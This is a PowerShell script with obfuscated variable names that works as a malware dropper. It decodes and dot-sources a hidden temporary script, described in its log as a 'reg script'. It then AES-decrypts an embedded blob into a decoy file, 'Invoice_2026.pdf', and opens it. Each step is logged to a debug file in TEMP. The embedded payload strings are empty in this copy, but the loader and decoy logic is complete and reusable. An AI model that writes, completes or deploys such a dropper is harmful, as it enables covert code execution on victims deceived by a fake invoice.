$ErrorActionPreference='Continue'
try{
$pjkmxs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(''))
$fnsuyn="$env:TEMP\mecaxnnk.ps1"
[IO.File]::WriteAllText($fnsuyn,$pjkmxs,[Text.Encoding]::UTF8)
"[step1] reg script written to $fnsuyn" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
. $fnsuyn
"[step1] reg script done" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
$tskgeu=[Convert]::FromBase64String('iBaPWfbC2dLyz3AGjOkwU+00I+Q1vyTuyHhyZ9LEwXg=')
$cdfqaj=[Convert]::FromBase64String('BFJ3Xa+UFpObKFpfmPOsTQ==')
$esupkw=[Convert]::FromBase64String('')
$hkibhh=New-Object Security.Cryptography.AesManaged
$hkibhh.Key=$tskgeu;$hkibhh.IV=$cdfqaj;$hkibhh.Mode='CBC';$hkibhh.Padding='PKCS7'
$uqwhto=$hkibhh.CreateDecryptor()
$ideabq=New-Object IO.MemoryStream(,$esupkw)
$cifpvo=New-Object Security.Cryptography.CryptoStream($ideabq,$uqwhto,[Security.Cryptography.CryptoStreamMode]::Read)
$tvyikj=New-Object IO.MemoryStream
$cifpvo.CopyTo($tvyikj);$hkibhh.Dispose()
$xuqvzl="$env:TEMP\Invoice_2026.pdf"
[IO.File]::WriteAllBytes($xuqvzl,$tvyikj.ToArray())
"[step2] PDF written to $xuqvzl" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
Start-Process $xuqvzl
"[step3] PDF opened" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
}catch{
"[ERROR] $($_.Exception.Message) at line $($_.InvocationInfo.ScriptLineNumber)" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
}
